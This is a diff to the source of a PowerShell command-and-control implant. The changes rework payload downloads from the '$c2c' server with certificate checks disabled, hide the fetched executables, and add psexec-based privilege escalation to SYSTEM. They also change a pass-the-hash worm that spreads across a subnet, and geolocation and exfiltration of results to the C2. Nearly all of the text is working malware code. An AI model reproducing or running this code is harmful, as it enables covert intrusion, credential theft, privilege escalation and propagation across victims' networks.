@@ -115,31 +115,20 @@ if ($pshversion -lt 3) {
 	If (Test-Path $exists){		
 		} 
 	else { # check architecture and install version x86 of cl.exe if so
-		if($env:PROCESSOR_ARCHITECTURE -eq "x86")
-			{
-			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/cl32.txt"
-			[string] $FileOnDisk =  "$env:userprofile\AppData\cl.txt"
-			if ($downloadURL.Substring(0,5) -ceq "https") {
-				[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
-			}
-			(New-Object System.Net.WebClient).DownloadFile($downloadURL,$FileOnDisk)
-			rename-item $FileOnDisk -NewName cl.exe
-			Write-Host "curl 32.." -ForegroundColor DarkGreen;
-			attrib +h "$env:userprofile\AppData\cl.exe"
-			}
+		if($env:PROCESSOR_ARCHITECTURE -eq "x86"){ $downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/cl32.txt" }
 		Else{ # install version x64 of cl.exe
-			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/cl64.txt"
-			[string] $FileOnDisk =  "$env:userprofile\AppData\cl.txt"
-			if ($downloadURL.Substring(0,5) -ceq "https") {
-				[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
-				}
-			(New-Object System.Net.WebClient).DownloadFile($downloadURL,$FileOnDisk)
-			rename-item $FileOnDisk -NewName cl.exe
-			Write-Host "curl 64.." -ForegroundColor DarkGreen
-			attrib +h "$env:userprofile\AppData\cl.exe"
-			}
+			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/cl64.txt" }
+		[string] $FileOnDisk =  "$env:userprofile\AppData\cl.txt"
+		if ($downloadURL.Substring(0,5) -ceq "https") {
+			[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
+		}
+		(New-Object System.Net.WebClient).DownloadFile($downloadURL,$FileOnDisk)
+		rename-item $FileOnDisk -NewName cl.exe
+		Write-Host "curl 32.." -ForegroundColor DarkGreen;
+		attrib +h "$env:userprofile\AppData\cl.exe"
+		}
 		
-		}	
+	}	
 	#Installation of Chocolatey 
 	if ($upgradepshell -eq "yes") {
 		$InstallDir="C:\ProgramData\choco"
@@ -309,6 +298,7 @@ iex ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/$ru
 			$credential = Get-Credential
 			$pass = $credential.GetNetworkCredential().password
 			$dom = $credential.GetNetworkCredential().Domain
+			if (!$dom) {$dom = (Get-WmiObject Win32_ComputerSystem).Domain}
 			$login = $credential.GetNetworkCredential().UserName
 			$logindom = "$dom\$login"  
 			
@@ -481,6 +471,29 @@ $r = $r + "---- PC Idle for " + $Idle.Days + " days, " + $Idle.Hours + " hours, 
 		function WMIRegisterPCKey { # Add WMI REG value of $PC to backup $REGKEY. registry key can be deleted, wmi key in more secret and will backup registry key OR can be use in place
 			IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/wmi-create.txt")
             Wmi-Create -EventFilterName "Cleanup" -EventConsumerName "$wmiOpskey" -ValueToCreate "$pc"
+		}
+		function PsexecDownload {
+			$exists = "$env:userprofile\help.exe"
+			If (Test-Path $exists){
+			 Write-Verbose "Already present"
+			} else {
+			if($env:PROCESSOR_ARCHITECTURE -eq "x86")
+			{$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/psx32.txt"}else{$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/psx64.txt"}
+            [string] $FileOnDisk =  "$env:userprofile\log.txt"
+            if ($downloadURL.Substring(0,5) -ceq "https") {
+                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
+            }
+			$WebRequest = [System.Net.Webrequest]::create($downloadURL)
+            $WebResponse = $WebRequest.GetResponse()
+            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
+            $WebResponse.Close()
+            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
+			#Convert txt to exe
+			Rename-Item $FileOnDisk help.exe
+			#[string]$hex = get-content -path $FileOnDisk
+			#[Byte[]] $temp = $hex -split ' '
+			#[System.IO.File]::WriteAllBytes("$env:userprofile\help.exe", $temp)
+			}
 		}
 		function persistAuto { # Actions for auto persistence
 				$Path =  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Exec Bypass -NoL -Win Hidden -Enc $myAgntencoded"
@@ -1196,7 +1209,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/klog.txt")
 					$public_ip = $node.Node.InnerText.Trim()
 				}
 			$map = "https://www.google.com/maps/search/?api=1&query="+"$lat"+","+"$lon";
-			$result = "$map ---->   PUBLIC IP: $public_ip  - COUNTRY: $country  - CITY: $city - REGION: $region - TIMEZONE: $timezone - ISP: $isp - ORG: $org - AS: $as"
+			$result = "$map | PUBLIC_IP:$public_ip | COUNTRY:$country |CITY:$city |REGION:$region |TIMEZONE:$timezone |ISP:$isp |ORG:$org |AS:$as"
 			sendC2 $pc $result $id
 			}	
 		Function GeolocateGPSCommand {
@@ -1457,11 +1470,6 @@ IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/chr
 			[string]$id
 			)
 			[String]$rs =""
-            #if ($IsAdmin -eq $True) {
-			#	IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/token.txt"));
-			#	Invoke-TokenManipulation -ImpersonateUser -Username 'nt authority\system';
-            #}
-			
 			IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/Invoke-MS16-032.txt"))
 			[string]$rs += "------------------------Invoke_MS16_032 :"
 			$rs += Invoke-MS16-032
@@ -1471,37 +1479,56 @@ IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/chr
 			$rs += "------------------------POWERUP - Privesc All Checks : "
 			IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/powerup.txt"))
 			$rs += Invoke-AllChecks
-			set-content .\privesc-vulns.txt -Value $rs
+			$runfile = "$env:userprofile\AppData\privesc-vulns.txt"
+			set-content $runfile -Value $rs
 			Start-Sleep -Seconds 80
-			$result += "Open privesc-vulns.txt -- WHO AM I : "
-			$result += whoami
-			exfiltrate .\privesc-vulns.txt
-			Remove-Item .\privesc-vulns.txt
+			$result = "$c2c/ROOT_FOLDER/exfil/$pc/privesc-vulns.txt"
+			exfiltrate $runfile
+			Remove-Item $runfile
 			sendC2 $pc $result $id
         }
-		Function GetsystemCommand { # !getsystem|1/2/3 - Try various privesc technic (obtain PID like !getpid|lsass)
+		Function GetsystemCommand { # !getsystem|1/2/3/4 - Try various privesc technic (obtain PID like !getpid|lsass)
 			[CmdletBinding()] param( 
 			[string]$id
 			)
-			[string] $cnd = "cmd /c powershell -exe bypass -Nol -win hidden -enc $myAgntencoded"
-			#Method 1
-			IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/psgetsys2.txt"))
-			Get-System
-			$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
-			#Method 2
-			if ($IsAdmin -eq $False) {Get-System -Technique Token}
-			$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
-			#Method 3
-			if ($IsAdmin -eq $False) {
-				(New-Object System.Net.WebClient).DownloadFile("$c2c/ROOT_FOLDER/LINK_FOLDER/psgetsys.ps1","$env:userprofile\psgetsys.ps1")
+			[string] $method = $LatestOrder.split('|')[1]
+			[string] $cmdline = "cmd /c powershell -exe bypass -Nol -win hidden -enc $myAgntencoded"
+			#Method 1 - Use of  psexec -s -i -d cmd.exe
+			if ($method -eq "1") {
+				PsexecDownload 
+				Start-Sleep -Seconds 10	
+				$result = Test-Path "$env:userprofile\help.exe"
+				if (Test-Path "$env:userprofile\help.exe") {
+					$Command = "$env:userprofile\help.exe -s -i -d $cmdline"
+					[string] $CmdPath = "$env:windir\System32\cmd.exe"
+					[string] $CmdString = "$CmdPath" + " /C " + "$Command"
+					Invoke-Expression $CmdString
+				}
+			}
+			#Method 2  - Use of Parent proces - https://www.puckiestyle.nl/getsystem-ps1/
+			if ($method -eq "2") {
+				if ($IsAdmin -eq $False) {
+				(New-Object System.Net.WebClient).DownloadFile("$c2c/ROOT_FOLDER/LINK_FOLDER/psgetsys.txt","$env:userprofile\psgetsys.txt")
+				Rename-Item $env:userprofile\psgetsys.txt $env:userprofile\psgetsys.ps1
 				import-module $env:userprofile\psgetsys.ps1;
 				$system_pid = get-process "lsass" |select -expand id
-				[MyProcess]::CreateProcessFromParent($system_pid,$cnd)
+				[MyProcess]::CreateProcessFromParent($system_pid,$cmdline)
+				}
+			$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")	
 			}
-			$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
-			$who = whoami
-			Start-Sleep -Seconds 80
-			$result = "$who "			
+			#Method 3
+			#if ($method -eq "3") {
+			#IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/psgetsys2.txt"))
+			#Get-System
+			#$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+			#}
+			#Method 4
+			#if ($method -eq "4") {
+			#	if ($IsAdmin -eq $False) {Get-System -Technique Token}
+			#$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+			#}
+			$result = whoami
+			Start-Sleep -Seconds 80		
 			sendC2 $pc $result $id
 		}
 		Function RunAsCommand { # !runas|IEX(New-Object Net.WebClient).DownloadString("http://c2/LINK_FOLDER/pnt.ps1"))
@@ -1757,15 +1784,15 @@ Invoke-PortFwd -bindPort $bindport -destHost $desthost -destPort $destport ;
 			sendC2 $pc $result $id
 			} 
 	#  Lateral movement & Propagation  
-		Function WormCommand {  	 # !worm|wmi/smb|login|hash|  -  use https://github.com/Kevin-Robertson/Invoke-TheHash
+		Function WormCommand {  	 # !worm|wmi/smb|192.168.10.0|login|hash|calc  -  use https://github.com/Kevin-Robertson/Invoke-TheHash
 			[CmdletBinding()] param( 
 			[string]$id
 			)
-			[string] $type = $LatestOrder.split('|')[2]
-			[string] $TargetNetwork = $LatestOrder.split('|')[1]
-			[string] $username = $LatestOrder.split('|')[2]
-			[string] $hash = $LatestOrder.split('|')[3]
-			[string] $command = $LatestOrder.split('|')[4]
+			[string] $type = $LatestOrder.split('|')[1]
+			[string] $TargetNetwork = $LatestOrder.split('|')[2]
+			[string] $username = $LatestOrder.split('|')[3]
+			[string] $hash = $LatestOrder.split('|')[4]
+			[string] $command = $LatestOrder.split('|')[5]
 			if (!$command) {  $command = "powershell.exe -Exec Bypass -NoL -Win Hidden -Enc $myAgntencoded" }
 			if ($type -eq "wmi") {
 			$cmde = @"
@@ -1778,7 +1805,7 @@ IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/pthw
 Invoke-TheHash -Type SMBExec -Target $TargetNetwork -TargetExclude $ip -Username $username -Hash $hash -Command $command
 "@
 			}
-			$result = "ok via - $type"
+			$result = "Wormized via : $type"
 			RunJob -code $cmde
 			sendC2 $pc $result $id
 		}
@@ -1790,47 +1817,16 @@ Invoke-TheHash -Type SMBExec -Target $TargetNetwork -TargetExclude $ip -Username
 			[string] $pass = $LatestOrder.split('|')[2]
 			[string] $ipAddress = $LatestOrder.split('|')[3]
 			[string] $cmdline = $LatestOrder.split('|')[4]
-			$logindom = "$dom\$login"
-			$exists = "$env:userprofile\help.exe"
-			If (Test-Path $exists){
-				del "$env:userprofile\log.txt"
-				del "$env:userprofile\help.exe"
-			}
-			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/psx.txt"
-            [string] $FileOnDisk =  "$env:userprofile\log.txt"
-			
-            if ($downloadURL.Substring(0,5) -ceq "https") {
-                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
-            }
-			$WebRequest = [System.Net.Webrequest]::create($downloadURL)
-            $WebResponse = $WebRequest.GetResponse()
-            $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
-            $WebResponse.Close()
-            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
-			#Convert txt to exe
-			[string]$hex = get-content -path $FileOnDisk
-			[Byte[]] $temp = $hex -split ' '
-			[System.IO.File]::WriteAllBytes("$env:userprofile\help.exe", $temp)
-			#attrib +h "$env:userprofile\help.exe"
-			#attrib +h "$env:userprofile\log.txt"
-			$result = ls | findstr help 
-			sendC2 $pc $result $id
-			Auth_psexec $ipAddress $hostName
-							
-			function Auth_psexec {
-				[CmdletBinding()] param( 
-					[string] $ip_target
-					)
-				$payload = @"
-IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/pnt.txt")
-"@
-				write-host "Successfully authenticated with domain "
-				$Command = "$env:userprofile\help.exe \\$ip_target -u $logindom -p $pass -h -d $cmdline"
+			if (!$cmdline) {$cmdline = "powershell.exe -Exec Bypass -NoL -Win Hidden -Enc $myAgntencoded"}
+			PsexecDownload 
+			$r = Test-Path "$env:userprofile\help.exe"
+			if (Test-Path "$env:userprofile\help.exe") {
+				$Command = "$env:userprofile\help.exe \\$ipAddress -u $login -p $pass -h -d $cmdline"
 				[string] $CmdPath = "$env:windir\System32\cmd.exe"
 				[string] $CmdString = "$CmdPath" + " /C " + "$Command"
 				Invoke-Expression $CmdString
-				del "$env:userprofile\help.exe"
 			}
+			$result = "Psexec downloaded:" + $r 
 			sendC2 $pc $result $id
 		}
 		Function pthWMICommand { # !pthwmi|192.168.3.202|toto|F6F38B793DB6A94BA04A5|powershell.exe 'calc.exe'
@@ -2506,6 +2502,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/setM
                 !persist {PersistCommand $id}		  #  !persist|reg/ startup/ task/ wmi/ sc/ all |calc
                 !runas {RunAsCommand $id}		      #  !runas|IEX(New-Object Net.WebClient).DownloadString("http://c2/LINK_FOLDER/pnt.ps1"))
 				!privesc {PrivescCommand $id}	      #  !privesc - Try to inject token in privilegied process and Check local privesc vulnerabilities (sherlock  & powerUp)
+				!getsystem {GetsystemCommand $id}     #  !getsystem|1/2/3/4 - Try various privesc technic (obtain PID like !getpid|lsass)
 				!ntlmspoof {InveighCommand $id}	  	  #  !ntlmspoof   - Use inveigh to peform Spoofing attack and capture various password (SMB, NTLM, HTTP, WPAD ...)
 				!arpspoof {ArpspoofCommand $id}	  	  #  !arpspoof 
 				!arp {ArpScanCommand $id}	  	  	  #  !arp  -  ping all the IP scope and return resulting arp cache (arp -a)
